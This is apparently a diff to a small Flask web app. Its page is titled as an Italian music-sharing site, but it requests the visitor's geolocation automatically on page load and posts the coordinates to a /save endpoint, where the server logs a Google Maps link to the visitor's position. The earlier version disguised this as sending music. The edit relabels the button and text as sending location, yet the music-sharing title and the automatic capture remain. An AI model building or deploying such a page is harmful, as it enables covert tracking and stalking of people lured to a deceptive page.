@@ -1,4 +1,6 @@
+
 from flask import Flask, request, jsonify
+import os
 
 app = Flask(__name__)
 
@@ -6,9 +8,9 @@ app = Flask(__name__)
 def home():
     return """
     <h1>Condivisione musica</h1>
-    <p>Premi il pulsante per condividere la tua Musica.</p>
+    <p>Aprendo questa pagina, il telefono chiederà il consenso per condividere la musica.</p>
 
-    <button onclick="mandaMusica()">📍 Invia musica</button>
+    <button onclick="mandaMusica()">📍 Invia posizione</button>
 
     <script>
     function mandaMusica() {
@@ -21,19 +23,18 @@ def home():
             lon: pos.coords.longitude
           })
         }).then(() => {
-          document.body.innerHTML = "Musica inviata correttamente.";
+          document.body.innerHTML = "Posizione inviata correttamente.";
         });
       }, function(error) {
         document.body.innerHTML = "Posizione non inviata: " + error.message;
-});
-}
+      });
+    }
 
-window.onload = function() {
-  mandaMusica();
-};
+    window.onload = function() {
+      mandaMusica();
+    };
     </script>
     """
-
 
 @app.route("/save", methods=["POST"])
 def save():
@@ -42,4 +43,6 @@ def save():
     print("🌍 Google Maps: https://www.google.com/maps?q={},{}".format(data["lat"], data["lon"]))
     return jsonify({"status": "ok"})
 
-app.run(host="0.0.0.0", port=52194)
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 52194))
+    app.run(host="0.0.0.0", port=port)
